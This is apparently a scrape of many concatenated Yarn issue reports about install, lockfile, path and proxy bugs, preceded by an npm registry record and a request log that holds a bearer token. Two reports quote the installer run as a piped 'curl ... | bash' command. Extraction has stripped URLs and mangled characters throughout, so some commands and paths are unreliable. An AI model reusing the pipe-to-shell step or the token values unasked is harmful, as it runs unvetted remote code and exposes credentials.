{ "name": "@testscope/hello12", "versions": { "1.0.6": { "name": "@testscope/hello12", "version": "1.0.6", "main": "index.js", "license": "mit", "_id": "@testscope/hello12@1.0.6", "scripts": {}, "_shasum": "b4880b9d85a49b5b08cdb5e3cd67fd5eec0e6177", "_from": ".", "_npmversion": "4.2.0", "_nodeversion": "7.10.0", "_npmuser": {}, "dist": { "shasum": "b4880b9d85a49b5b08cdb5e3cd67fd5eec0e6177", "tarball": " " } }, "1.0.7": { "name": "@testscope/hello12", "version": "1.0.7", "main": "index.js", "license": "mit", "_id": "@testscope/hello12@1.0.7", "scripts": {}, "_shasum": "a08c02725c91058d94dfad091fcf98b2a920d8f3", "_from": ".", "_npmversion": "4.2.0", "_nodeversion": "7.10.0", "_npmuser": {}, "dist": { "shasum": "a08c02725c91058d94dfad091fcf98b2a920d8f3", "tarball": " " } } }, "dist-tags": { "latest": "1.0.7" }, "_rev": "9-6457ff279507dc08", "readme": "", "_attachments": {}
``` ## get package
get /@testscope%2fhello12/-/hello12-1.0.7.tgz http/1.1\ \
authorization: bearer vihb9ajr0pf7rs684a0dcnbndbg43wyfls0kichewmi=\ \
version: 4.2.0\ \
accept: application/x-tar, application/vnd.github+json; q=0.1\ \
referer: install [redacted]\ \
npm-session: cf9f3e7010c7d3f1\ \
npm-in-ci: false\ \
user-agent: npm/4.2.0 node/v7.10.0 linux x64\ \
host: 127.0.0.1:4873\ \
connection: keep-alive\ \
http/1.1 200 ok
x-powered-by: verdaccio/2.1.7
content-type: application/octet-stream
content-length: 767
x-status-cat:
date: wed, 17 may 2017 08:41:59 gmt
connection: keep-alive <some ugly binary data>
when you npm install a package like sentry-cli-binary the postinstall step will download a platform specific executable and put it into the bin folder
with yarn the symlink is not generated because the file does not exist yet
**if the current behavior is a bug, please provide the steps to reproduce.**
make a dependency to `sentry-cli-binary` and observe that yarn does not install the symlink for the binary whereas npm does.
publish a package (i used npm to publish)
`yarn add` the package to a project
rename a file in the package **only changing the case of the filename**
publish again (using npm again)
`yarn upgrade` the package in the project
the renamed file will be missing from the installed package in `node_modules` **if the current behavior is a bug, please provide the steps to reproduce.**
if a package has already been added as a dependency, running `yarn add <pkg> -d` does not add it to `devdependencies`
the `-d` switch is ignored with no indication to the user that it's still only listed as a regular dependency
**if the current behavior is a bug, please provide the steps to reproduce.**
yarn add <pkg>
cat package.json | less
yarn add <pkg> -d
cat package.json | less
missing executable file
sh: optipng: command not found
error command failed with exit code 127.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
`yarn init -y`
`yarn add optipng`
add script to *package.json* `"scripts": { "test": "optipng img/*" },`
`yarn run test`
when maximizing the cmd window the loading bar is stretched to the sides of the window
and then when minimizing back the loading bar did not minimize and stays the same (see reference above) **if the current behavior is a bug, please provide the steps to reproduce.**
maximize the screen and minimize the cmd window
`yarn install` with ends up with garbage characters in `node_modules/.bin/gulp.cmd`
this appears to be exactly as described in #828.
#828 was *closed fixed* based on [pr2795]( but in the comments on that pr you can find a number of comments that this does not entirely fix the problem
in that thread of comments [pr3097]( is proposed as a solution but hasn't been merged yet
**if the current behavior is a bug, please provide the steps to reproduce.**
see #828 or
clone
`yarn install`
`gulp` <-- fails view `node_modules/.bin/gulp.cmd` and see corruption as described in #828
i'm migrating my project from npm to yarn following [this guide](
however the `yarn` command report the following error:
[1/4] resolving packages...
error couldn\'t find package "@scope/package" on the "npm" registry.
info visit for documentation about this command.
but when i delete the scoped packages from package.json, yarn installs and generates yarn.lock normally
then i add the scoped packages back, these packages are installed normally out of surprise
additionally, my .npmrc config is like:
@scope:registry=
in which x.x.x.x is the server running jfrog artifactory
**if the current behavior is a bug, please provide the steps to reproduce.**
steps are provided above.
`command not found: yarnpkg`
**if the current behavior is a bug, please provide the steps to reproduce.** i had hadoop-yarn, so when i `brew upgrade yarn` , it remind me the `brew link` step did not complete successfully
but i dont want to uninstall `hadoop-yarn`, i want use yarnpkg
`yarn upgrade` updates the version of npmlog, but does not check its dependencies
**if the current behavior is a bug, please provide the steps to reproduce.** suppose you have a very simple package.json file like following:
{ "dependencies": { "npm": "^3.10.5" }
you will find the folder structure is like:
node_modules
pm@3.10.10
pmlog@4.0.0
auge@2.6.0
then `yarn upgrade`.
node_modules
pm@3.10.10
pmlog@4.0.2 // it is updated, but it requires "gauge": "~2.7.1"
auge@2.6.0
pretty much the same as in #1827
the build process is running in a chroot with uid 0 but no actual root permissions
this leads to yarn failing to create `/usr/local/share/.config`
**if the current behavior is a bug, please provide the steps to reproduce.** run yarn in a chroot with uid 0 but no actual root privileges
this leads to yarn failing to create `/usr/local/share/.config`.
i have `jest` included in my `package.json` devdependencies
i tried to upgrade it, but mistyped it: `yarn upgrade hest`
sure enough, yarn installed a package called `hest` and added it to `dependencies`
**if the current behavior is a bug, please provide the steps to reproduce.** run `yarn upgrade <a name that doesn't exist in your package.json dependencies>`
when adding a remote tarball package an error occurs: error an unexpected error occurred: " eisdir: illegal operation on a directory, open \'/home/luiz/.cac
he/yarn/v1/.tmp/9417ab587e459fe380a7e913f4160254/\'"
**if the current behavior is a bug, please provide the steps to reproduce.** in an empty folder: `yarn init` // create a dummy project
`yarn add ` manually updating dependencies in package.json like ```
dependencies: { "cherrytree": " "
``` and doing `yarn install` the error also occurs
attempting to install packages from artifactory using v0.23.2 of yarn results in a 401 error being returned from artifactory
this error does not occur with v0.22.0 and earlier
**if the current behavior is a bug, please provide the steps to reproduce.**
configure ~/.npmrc with the authentication token from artifactory.
change the default registry using `yarn config set registry -g`
run `yarn --verbose --pure-lockfile`
not all packages are included in `yarn licenses generate-disclaimer`
**if the current behavior is a bug, please provide the steps to reproduce.** ```bash
yarn init -yy
yarn add nodetunes
yarn licenses generate-disclaimer | grep "nodetunes" # nothing
``` i don't know if this applies to other packages, i just happened to notice that this one was missing.
i have a stable branch in my project that gets updated every time the ci build passes.
eventually we want to be able to use that branch in our package.json, but i'm facing yarn issues with bad hash
see this other related issue:
so to try and fix the hash issue we decided to specify the commit hash in the package.json itself, but yarn seems to be ignoring that entry
**if the current behavior is a bug, please provide the steps to reproduce.** here is our `package.json` entry: ```
"dependencies": { "grommet": " #85a1b40e4616fe54e4e13fdd9350128d1f0508e6", }
``` here is the `yarn.lock` section: ```
"grommet@ #85a1b40e4616fe54e4e13fdd9350128d1f0508e6": version "1.3.4" resolved " #2e18b1cba634cd1cfda9a3d601ae74fe77eacee1"
yarn fails to install a package dependencies raising:
error: enoent: no such file or directory, open '/root/.cache/yarn/v1/npm-babel-cli-6.24.0-a05ffd210dca0c288a26d5319c5ac8669a265ad0/.yarn-tarball.tgz'
``` **if the current behavior is a bug, please provide the steps to reproduce.**
yarn's `package.json` contains an `installationmethod` key for determining the installation method that was used to install yarn
this is used so we know which command to suggest to upgrade yarn
this used to work correctly as `package.json` was sitting alongside yarn itself and it did `require('./package.json')`, but now that the standalone .js file is included in the tarball, `package.json` is bundled into the js file and thus updating `package.json` doesn't work to update the installationmethod
potentially yarn should still load `package.json` (but be careful to not break running the standalone .js file separately.
yarn add global fails with `eperm: operation not permitted` **if the current behavior is a bug, please provide the steps to reproduce.** 1
install yarn using msi on windows 10 x64
do `yarn init` and then `yarn global add codeceptjs`
packages published via `yarn publish`, on windows, seem to use backslash as a path separator for file paths
this becomes a problem when these packages are added on *nix systems where the backslash is interpreted as part of the filename and not as a directory separator
so if a package is published, on windows, with the following file path: `dist/test.min.js`
when added, on a *nix system, the file is downloaded and created as: `dist\\test.min.js` **if the current behavior is a bug, please provide the steps to reproduce.**
publish a package on a windows system (`yarn publish blah`)
add that package as dependency to a project via `yarn add blah` on a *nix system
yarn apply .npmignore from subdirectories to root **if the current behavior is a bug, please provide the steps to reproduce.**
repository with package to reproduce `yarn pack` creates tgz archive with following content:
$ tar -tvf yarn-npmignore-bug-v1.0.0.tgz drwxr-xr-x 0/0 0 2017-03-30 11:34 package/
-rw-rw-r-- 0/0 1074 2017-03-30 11:30 package/license
-rw-rw-r-- 0/0 20 2017-03-30 11:30 package/readme.md
-rw-rw-r-- 0/0 140 2017-03-30 11:31 package/package.json
drwxrwxr-x 0/0 0 2017-03-30 11:23 package/lib/
-rw-rw-r-- 0/0 0 2017-03-30 11:22 package/lib/file.txt
``` `package/index.js` from root is missing
conflicting nested dependencies are not always installing in the same location
so if yarn decides it needs to install foo@1 and foo@2, it could install node_modules/foo@1 & node_modules/bar/node_modules/foo@2 or node_modules/foo@2 & node_modules/bat/node_modules/foo@1
why this matters: we autogenerate a .deps file that we can hand to make
if files can move when somebody runs yarn, this really confuses make
the makefile knows it has to regenerate the .deps file when package.json or yarn.lock change, but if they don't it gets confused
**if the current behavior is a bug, please provide the steps to reproduce.** package.json & yarn.lock attached below
the specific package that is giving us problems is gauge, which is required by npmlog, which our dependencies require different versions of.
when i run `yarn global add gulp-cli` on windows within the git bash shell (mingw), it doesn't install the command
i looked into the reason and it seems it isn't detecting that it's running within mingw
so the path it should be installing to is `/c/users/geza/appdata/roaming/npm` but the output of `yarn global bin` is `c:\\program files\ odejs` **if the current behavior is a bug, please provide the steps to reproduce.** this is on a fresh install of windows 10 enterprise, 64-bit 1) install nodejs (i installed the latest version, 7.7.4)
go with the default options (ie, let it install nodejs to the windows path)
2) install git for for windows from (i installed the latest version, 2.12.1)
again, go with the default options (ie, let it install git to the windows path).
3) reboot windows so we have git and node in our path
4) open the git bash shell
5) run `npm install -g yarn` to install yarn
6) run `yarn global add gulp-cli`
7) run `gulp` the `gulp` command is not found
if we check `/c/users/geza/appdata/roaming/npm` then there is no file named `gulp` there if we instead run `npm install -g gulp-cli` then the `gulp` binary shows up at `/c/users/geza/appdata/roaming/npm` and gulp works.
scoped packages published via npm are usable in projects
scoped packages published via yarn cannot resolve, as the tgz file isn't created
**if the current behavior is a bug, please provide the steps to reproduce.**
_using npm_: running `npm publish` on the projects directory, after bumping the version number of the package, i'm able to go to a scratch directory, do `npm init`, then `npm install @organization/organization-package` and it and dependencies install just fine
_using yarn_: running `yarn publish` on the projects directory, after bumping the version number of the package, i'm able to go to a scratch directory, do `yarn init`, then `yarn add @organization/organization-package`, what happens is the tgz file doesn't seem to be created
this is related to #521.
when `yarn publish` is run, the command interactively asks the user for a new version to which it will bump the package and create a new git commit and tag (if inside a git repo)
if a version is not provided (i.e
just enter is pressed), the command goes on to ask for login information as part of the next step
at this point, it is unclear to the user with what version yarn is proceeding (maybe it chose to bump patch by 1?) and what additional actions (side effects) yarn may perform.
`yarn upgrade-interactive` in a repo on a git+ssh:// url as a dependency turns the git+ssh url into a regular registry.yarnpkg.com package instead of the git url
[a]( deps [b](
initially, a's yarn.lock file looks like this:
"b@git+ssh://git@github.com/magicmark/b.git#v1.0.0": version "1.0.0" resolved "git+ssh://git@github.com/magicmark/b.git#8b2a343f1ef4ad1a29a01d4680d955b0b9ed0aa5"
``` after doing `$ yarn upgrade-interactive`, and trying to upgrade to 1.0.1, the lockfile looks like this:
b@^0.0.1: version "0.0.1" resolved " #6585073338a033249060fde993d9815a909443bb"
``` **if the current behavior is a bug, please provide the steps to reproduce.**
- clone
- do a `$ yarn install`
- check yarn.lock file to see the correct git url
- do `$ yarn upgrade-interactive` and upgrade b
- check yarn.lock file and see that the resolved package is a different package.
if you set the yarn cache directory using a relative path, yarn never resolves an absolute reference for that directory
for example, if you run `yarn config set cache-folder ../yarn-cache`, `yarn cache dir` will output `../yarn-cache`, no matter where you are
**if the current behavior is a bug, please provide the steps to reproduce.**
run `yarn config set cache-folder ../yarn-cache`
`../yarn-cache` will be created, but `yarn cache dir` will still output `../yarn-cache`, and if you change directories then run `yarn` again, a new folder will be made at `../yarn-cache`.
after running a command like `yarn upgrade {pkg}` or `yarn upgrade-interactive`, the npm `postinstall` script is not being run.
if the global prefix is set to a path contain a tilde-character `yarn global bin` seems to treat it as dot-character, i.e
a relative path
**if the current behavior is a bug, please provide the steps to reproduce.** ```
$ yarn config list
info npm config
{ prefix: '~/.npm-global' }
/users/creynders/foo/bar/qux
$ yarn global bin
/users/creynders/foo/bar/qux/~/.npm-global/bin
when install new package which is the same name as the old one from git repo, the old package in yarn.lock does not disappear
**the steps to reproduce :**
npm init -y
yarn add
yarn add
``` see yarn.lock:
"ug@ ": version "1.0.0" resolved " #5a0400908d4a2b3ad8ce6d9a4c42fd3d3640983c" dependencies: escodegen "^1.6.1" esprima "^2.5.0" uglify-js "^2.4.24" "ug@ ": version "1.0.0" resolved " #d38db29b6ce10037d235875c3b5b56b97a36877e" dependencies: escodegen "^1.6.1" esprima "^2.5.0" uglify-js "^2.4.24"
when a batch script on windows contains a call to `yarn install`, the exit of `yarn install` causes the entire batch file to exit with yarn's exit code **if the current behavior is a bug, please provide the steps to reproduce.**
- a folder with `package.json`/`yarn.lock`
- a script with something like: ```cmd
yarn install
echo "test!"
run the batch file (`.\\test.bat`)
watch as `yarn install` is run
watch as the script exits without running the `echo` line
yarn will prompt you to update if it sees the version you are using is behind the current release
in my case, because i installed with the `install.sh` script, it prompts me to do so again
however, if the file it attempts to download is unavailable (say, during the s3 apocalypse of 2017), the install will fail
but because it has already removed `$home/.yarn`, it leaves the user without even their older yarn installation
**if the current behavior is a bug, please provide the steps to reproduce.**
i'm not sure..
you would have to recreate a scenario where the yarn site is live, but the package is not.
when you install yarn add package@next package.json
"package": "next",
when trying to add a package with a forward slash in the name using git bash (mingw terminal), the forward slash is replaced by 2 backslashes **if the current behavior is a bug, please provide the steps to reproduce.**
- run yarn under the git bash terminal emulator on windows 10.
- try to add a package with a forward slash in the name
eg: `yarn add @types/rx`
- yarn tries the package name "@types\\\\\\\ x" instead of "@types/rx"
this happens with `yarn add` and `yarn remove` ![yarn-add-error](
yarn doesn't work behind a corporate proxy with cntlm on other port than 80
npm works fine
**if the current behavior is a bug, please provide the steps to reproduce.**
- setup cntlm with default port 3128
- setup yarn config proxy and https-proxy to " "
- run "yarn global add yo"
- the following error occurs: ```bash
$ yarn global add yo
yarn global v0.20.3
[1/4] resolving packages...
warning there appears to be trouble with your network connection
retrying...
error an unexpected error occurred: " connect econnrefused 127.0.0.1:80".
info if you think this is a bug, please open a bug report with the information provided in "c:\\\\users\\\\gustavo_71112\\\\appdata\\\\local\\\\yarn\\\\config\\\\global\\\\yarn-error.log".
info visit for documentation about this command.
i have a url in my deps: `"trae": " ",`
i run `yarn`
i make a commit to repo.
i run `yarn add ` to get the latest version from my repo
y add
yarn add v0.20.3
[1/4] resolving packages...
error command failed.
exit code: 128
command: git
arguments: pull
directory: /home/capaj/.cache/yarn/.tmp/a0218de46c09eeeba3aa6e9bed4d0f17
error: pull is not possible because you have unmerged files.
hint: fix them up in the work tree, and then use 'git add/rm <file>'
hint: as appropriate to mark resolution and make a commit.
fatal: exiting because of an unresolved conflict.
info visit for documentation about this command
after walking through the steps from [this guide]( it seems that some dependancies are being stored into the lock file as the remote urls instead of saving them as tarballs
**if the current behavior is a bug, please provide the steps to reproduce.** ```
> yarn config set yarn-offline-mirror ./npm-packages-offline-cache
> mv ~/.yarnrc ./
> rm -rf node_modules/ yarn.lock
> yarn install
`yarn pack` does not package bundleddependecies in v0.19.0, v0.19.1 and v0.20.0 **if the current behavior is a bug, please provide the steps to reproduce.**
{ "name": "test-bundled-deps", "version": "0.0.0", "dependencies": { "bcryptjs": "^2.0.0", }, "bundleddependencies": [ "bcryptjs", ]
then run `yarn` followed by `yarn pack`
check the tgz file
it will not contain the node_modules folder.
`.*ignore` rules specified within subdirectories apply to *all* directories, whereas they should only apply to the directory and subdirectories of where they were declared
**if the current behavior is a bug, please provide the steps to reproduce.** ```bash
#!/usr/bin/env bash
git init ; yarn init -y
# tell git, npm, and yarn to ignore /dir/foo
echo "foo" > dir/.gitignore
git add dir/.gitignore ; git commit -m "initial commit" # should ignore this file
touch dir/foo # should *not* ignore this file
touch foo # create npm and yarn packages to that we can see what gets ignored
yarn pack --filename yarn-pack.tgz echo git
# git sees "foo" and ignores "dir/foo"
git status echo npm
# npm does the same
tar -tf *-1.0.0.tgz echo yarn
# notice that yarn ignored both "foo" and "dir/foo"
tar -tf yarn-pack.tgz
i tried installing yarn using the installation script from #alternatives-tab (i'm on windows, but i don't have admin rights, so i can't use the windows installer)
after downloading the script it fails:
$ curl -o- -l | bash % total % received % xferd average speed time time time current dload upload total spent left speed
100 6742 0 6742 0 0 1694 0 --:--:-- 0:00:03 --:--:-- 1701
installing yarn!
/c/users/myuser/.yarn/bin/yarn
stdin is not a tty
``` when i try to run the `install.sh` file directly, i get the same error:
$ "./install.sh"
installing yarn!
/c/users/myuser/.yarn/bin/yarn
stdout is not a tty
``` **if the current behavior is a bug, please provide the steps to reproduce.**
download the `install.sh` file from #alternatives-tab
run from git bash
i'm receiving the following error when running yarn: $ yarn --version
module.js:471 throw err; ^ error: cannot find module 'c:\\c\\program files (x86)\\yarn\\bin\\yarn.js' at function.module._resolvefilename (module.js:469:15) at function.module._load (module.js:417:25) at module.runmain (module.js:604:10) at run (bootstrap_node.js:394:7) at startup (bootstrap_node.js:149:9) at bootstrap_node.js:509:3 looks like the path is invalid: c:\\c\\program files (x86)\\yarn\\bin\\yarn.js
c:\\program files (x86)\\yarn\\bin\\yarn.js an extra "c\\" directory level is being added
**if the current behavior is a bug, please provide the steps to reproduce.**
i was previously running version 0.18.1
downloaded the latest windows msi - yarn-0.19.1.msi and ran the installation
no errors seen
i've rolled back to 0.18.1 and it works fine
i tried removing completely and installing from fresh but get the same error
oddly, i went through the same process on another machine yesterday and it worked fine
i can't recall but i think i was previously on 0.19.0 on this machine, which is only difference i can think of.
`yarn config set strict-ssl false` sets it to string 'false' instead of boolean false
in consequence, 'false' seems to be treated as truthy and has no effect
**if the current behavior is a bug, please provide the steps to reproduce.**
see **expected behaviour**
the config value should have been set to boolean false.
yarn installation with certain packages causes ebusy error in node-gyp step
perhaps due to yarn trying to install all native modules simultaneously while `npm i` installs them synchronously
**if the current behavior is a bug, please provide the steps to reproduce.**
run `yarn` in a directory with the following package.json:
{ "name": "testing", "version": "1.0.0", "main": "index.js", "license": "mit", "dependencies": { "diskusage": "0.1.5", "electron-spellchecker": "0.5.8" }
when changing `cache-folder` in `.yarnrc` to a windows network share path (unc path name), a `yarn install` results in a javascript out of memory error
this happens with the `--no-progress` flag as well
ps c:\\projects\\..
...\\aurelia> yarn
yarn install v0.18.1
[1/4] resolving packages...
[2/4] fetching packages...
814/815
<--- last few gcs ---> 64216 ms: mark-sweep 1378.1 (1434.0) -> 1378.1 (1434.0) mb, 1135.1 / 0.0 ms [allocation failure] [gc in old space requested]
65430 ms: mark-sweep 1378.1 (1434.0) -> 1381.2 (1418.0) mb, 1213.6 / 0.0 ms (+ 0.5 ms in 1 steps since start of marking, biggest step 0.5 ms) [last resort gc]
66644 ms: mark-sweep 1381.2 (1418.0) -> 1385.6 (1418.0) mb, 1213.8 / 0.0 ms [last resort gc]
<--- js stacktrace ---> ==== js stack trace ========================================= security context: 000003596e7cfb61 <js object> 1: checkpeakmemory [c:\\program files (x86)\\yarn\\lib\ eporters\\base-reporter.js:120] [pc=00000388d7a94b3d] (this=0000033962d6b0c9 <a basereporter w
ith map 000002c2d4382379>) 2: _ontimeout [c:\\program files (x86)\\yarn\\lib\ eporters\\base-reporter.js:115] [pc=00000388d7745393] (this=0000033962de8c71 <a timeout with map 00
0001ab17f2c791>) 3: ontimeout(aka ontimeout) [timers.js:365] [pc..
fatal error: call_and_retry_last allocation failed - javascript heap out of memory
``` note that the cache is populated at this time; i can see packages in the network cache directory
**if the current behavior is a bug, please provide the steps to reproduce.** change the `cache-folder` value in `.yarnrc` to a network share with a windows unc path
project `.yarnrc` file:
registry " "
strict-ssl false
cache-folder "\\\\\\\ etworkshare\\\\d\\\\developer\\\\.yarn-cache"
``` output of `yarn config list`:
yarn config v0.18.1
info yarn config
{ registry: ' 'strict-ssl': false, 'cache-folder': '\\\\\\\\oirappvintd01\\\\d\\\\developer\\\\.yarn-cache', lastupdatecheck: 1484067134559, 'version-tag-prefix': 'v', 'version-git-tag': true, 'version-git-sign': false, 'version-git-message': 'v%s', 'init-version': '1.0.0', 'init-license': 'mit', 'save-prefix': '^', 'ignore-scripts': false, 'ignore-optional': false, 'user-agent': 'yarn/0.18.1 npm/? node/v6.9.2 win32 x64' }
info npm config
{ registry: ' 'strict-ssl': false, loglevel: 'warn' }
done in 0.11s.
with an `~/.npmrc` file like this: ```
//registry.npmjs.org/:_authtoken=<a public npm access token>
``` `yarn` will always send this access token even when installing from a different registry
**if the current behavior is a bug, please provide the steps to reproduce.** 1
create `~/.npmrc` file with `//registry.npmjs.org/:_authtoken=not-valid-for-every-registry`
create directory with `.npmrc` pointing to another registry, e.g
`registry= `
run `yarn add protobufjs` (or any other package using scoped package names)
c:\\code\\universitysite [code-quality +0 ~1 -0 !]> npm run lint > universitysite@2014.1.0 lint c:\\code\\universitysite
> gulp lint s" lint was unexpected at this time.
c:\\code\\universitysite [code-quality +0 ~1 -0 !]> yarn run lint
yarn run v0.18.1
$ gulp lint
s" lint was unexpected at this time.
``` __note:__ it doesn't matter what the gulp task is
**please mention your node.js, yarn and operating system version.** node v6.6.0
yarn v0.18.1
windows 10 everything works as expected on macos and linux, windows just doesn't want to behave (what's new...) this may be a dupe, but i couldn't find anything os specific in the issue tracker
if so, my apologies.
keep showing **there appears to be trouble with your network connection
retrying..** **if the current behavior is a bug, please provide the steps to reproduce.**
run **yarn** in root folder
i can not run globally installed packages (uglifyjs, eslint etc)
looks like there are problems with path
when i run (you full steps can see below) commands i get errors about path is incorrect
path is: `/d/dev/nodejs/c:/users/vlad/appdata/local/yarn/config/global/node_modules/.bin/uglifyjs`.
it is not problem with `uglifyjs`
if i will install `eslint` globally or something like that i am getting same behaviour
i am trying to do this in git bash terminal (mingw64)
if i try to run same command in cmd, cmd window is just disappearing
i also tried to create `.cmd` file and run commands from this file via: `cmdfilename >> xx.txt`
i got this in output: ```
c:\\users\\vlad>eslint --help c:\\users\\vlad>"$basedir/c:/users/vlad/appdata/local/yarn/config/global/node_modules/.bin/eslint.cmd" "$@" c:\\users\\vlad>exit $? ``` **if the current behavior is a bug, please provide the steps to reproduce.** 1
install yarn with windows installer.
install `uglify-js` (or anything else) globally (from npm):
vlad@vladpc mingw64 /
$ yarn global add uglify-js
yarn global v0.17.10
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success installed uglify-js@2.7.5 with binaries: - uglifyjs
warning no license field
done in 1.71s.
use installed package
vlad@vladpc mingw64 /
/bin/sh: /d/dev/nodejs/c:/users/vlad/appdata/local/yarn/config/global/node_modules/.bin/uglifyjs: no such file or directory
before trying to write a progress bar, yarn checks if **stdout** is a tty, but writes the progress to **stderr**
when `yarn add` is spawned as a child process with a non-tty stderr (e.g
using the `pipe` or `ignore` option for `stderr`), it fails unless also stdout is not a tty
following script fails:
const { spawn } = require('child_process'); const yarn = spawn('yarn', ['add', 'react'], { stdio: [process.stdin, process.stdout, 'pipe']
yarn.stderr.on('data', (data) => { console.log(data.tostring());
yarn-error.log:
arguments: /users/ville/.nvm/versions/node/v6.9.1/bin/node /users/ville/.nvm/versions/node/v6.9.1/bin/yarn add react path: /users/ville/.rvm/gems/ruby-2.3.1/bin:/users/ville/.rvm/gems/ruby-2.3.1@global/bin:/users/ville/.rvm/rubies/ruby-2.3.1/bin:/usr/local/heroku/bin:/users/ville/.nvm/versions/node/v6.9.1/bin:/users/ville/.opam/4.02.3/bin:/library/frameworks/python.framework/versions/3.5/bin:/usr/local/bin:/usr/local/sbin:/users/ville/bin:/users/ville/android-sdk-macosx/tools:/users/ville/android-sdk-macosx/platform-tools:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/x11/bin:/users/ville/.rvm/bin yarn version: 0.17.10 node version: 6.9.1 platform: darwin x64 npm manifest: no manifest yarn manifest: no manifest lockfile: no lockfile trace: typeerror: expected `count` to be a positive finite number at module.exports (/users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/node_modules/repeating/index.js:10:9) at progressbar.render (/users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/lib/reporters/console/progress-bar.js:58:22) at consolereporter.progress (/users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/lib/reporters/console/console-reporter.js:396:9) at /users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/lib/package-fetcher.js:123:36 at next (native) at step (/users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:35:14 at promise.f (/users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/node_modules/core-js/library/modules/_export.js:35:28) at /users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:14:12 at packagefetcher.init (/users/ville/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/lib/package-fetcher.js:158:7)
yarn fails to install `create-react-app`: ```
c:\\users\\gaearon>yarn global add create-react-app
yarn global v0.17.10
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success installed create-react-app@1.0.0 with binaries: - create-react-app
error an unexpected error occurred: "eperm: operation not permitted, open \'c:\\\\program files\\\ odejs\\\\create-react-app.cmd\'".
info if you think this is a bug, please open a bug report with the information provided in "c:\\\\users\\\\gaearon\\\\appdata\\\\local\\\\yarn\\\\config\\\\global\\\\yarn-error.log".
info visit for documentation about this command.
``` i have no such problem with npm: ```
c:\\users\\gaearon> npm i -g create-react-app
c:\\users\\gaearon\\appdata\ oaming\ pm\\create-react-app -> c:\\users\\gaearon\\appdata\ oaming\ pm\ ode_modules\\create-react-app\\index.js
c:\\users\\gaearon\\appdata\ oaming\ pm
`-- create-react-app@1.0.0 ...
``` **if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn global add create-react-app
when i try to init using the command `yarn init`, the following error occurs after the question `entry point (index.js)`: `error an unexpected error occurred: "cannot convert object to primitive value".` **please mention your node.js, yarn and operating system version.** node.js: v6.9.2
yarn: v0.17.10
distributor id: ubuntu
description: ubuntu 16.04.1 lts
release: 16.04
codename: xenial trace from the yarn-error.log file: ```json
arguments: /usr/bin/nodejs /usr/share/yarn/bin/yarn.js init path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games yarn version: 0.17.10 node version: 6.9.2 platform: linux x64 npm manifest: { "name": "dataextractor", "version": "4.7.5", "description": "script to extract data from files", "author": "marcelo franco filipe alves <marcelo.alves@garimpo.io>", "private": true, "engines": { "node": "6.7.0", "npm": "3.10.8" }, "repository": { "type": "git", "url": " " }, "bugs": { "url": " " }, "scripts": { "start": "node-dev ./index.ls" }, "dependencies": { "@extract/textract": "4.1.0", "async": "1.5.2", "chalk": "1.1.1", "debug": "2.2.0", "glob": "7.0.3", "inquirer": "1.0.2", "livescript": "1.5.0", "mime": "1.3.4", "node-dev": "3.1.3", "node-xlsx": "0.7.1" }, "devdependencies": { "gulp": "3.9.1", "gulp-js-obfuscator": "1.0.0", "gulp-livescript": "3.0.1" }, "license": "unlicensed" } yarn manifest: no manifest lockfile: no lockfile trace: typeerror: cannot convert object to primitive value at object.<anonymous> (/usr/share/yarn/lib/cli/commands/init.js:93:27) at next (native) at step (/usr/share/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /usr/share/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:28:13 at process._tickcallback (internal/process/next_tick.js:103:7)
`yarn info` doesn\'t support the "dot notation" to access deeply nested fields
to see that, invoke:
yarn info angular-cli dist-tags.latest
and see that it returns undefined
compare that to the `npm` output:
npm info angular-cli dist-tags.latest
which returns `1.0.0-beta.22-1`
without using the dot notation, both look similar (although yarn introduces some authentication noise that erroneously goes to stdout instead of stderr)
**if the current behavior is a bug, please provide the steps to reproduce.**
if yarn need to write in a read-only directory, it hangs forever
**if the current behavior is a bug, please provide the steps to reproduce.**
mkdir -m 500 bar && cd bar
yarn init -y
then yarn says it successfully has written package.json, but just hangs forever.
the installation script fails if ~/.yarn exists but does not contain a yarn installation
**if the current behavior is a bug, please provide the steps to reproduce.**
rm -rf ~/.yarn
mkdir ~/.yarn
curl -o- -l | bash -s -- --version 0.17.9
results in:
installing yarn!
./install.sh: line 164: yarn: command not found
`fsevents` is only relevant on mac os, it does not compile on linux or windows
yarn appears to try and compile it even on incompatible operating system
this is a waste of time as it's always going to fail
**if the current behavior is a bug, please provide the steps to reproduce.**
this is the `package.json` from one of my sites:
{ "name": "sitename", "version": "0.0.0", "description": "", "main": "index.js", "devdependencies": { "assets-webpack-plugin": "~3.0.0", "babel-core": "~5.8.25", "babel-loader": "~5.3.2", "exports-loader": "~0.6.2", "expose-loader": "~0.7.0", "imports-loader": "~0.6.4", "webpack": "~1.12.2" }, "repository": { "type": "git", "url": "daniel@host.dan.cx:/var/local/git/sitename" }, "author": "daniel lo nigro <daniel@dan.cx> ( ", "scripts": { "build-dev": "node_env=development webpack -d", "build-prod": "node_env=production webpack -p", "watch": "node_env=development webpack --progress --colors --watch -d", "update-babel-helpers": "babel-external-helpers -l get,inherits,create-class,class-call-check,extends,interop-require-default > ./public/assets/js/babel-external-helpers.js" }, "dependencies": { "array.prototype.find": "~1.0.0", "babel-runtime": "~5.8.25", "classnames": "^2.1.5", "fbemitter": "^2.0.0", "flux": "~2.1.1", "react": "~0.14.0", "react-onclickoutside": "git://github.com/daniel15/react-onclickoutside.git" }
``` running `yarn` gives me this as part of the output:
[2/4] fetching packages...
warning fsevents@1.0.15: the platform "win32" is incompatible with this module.
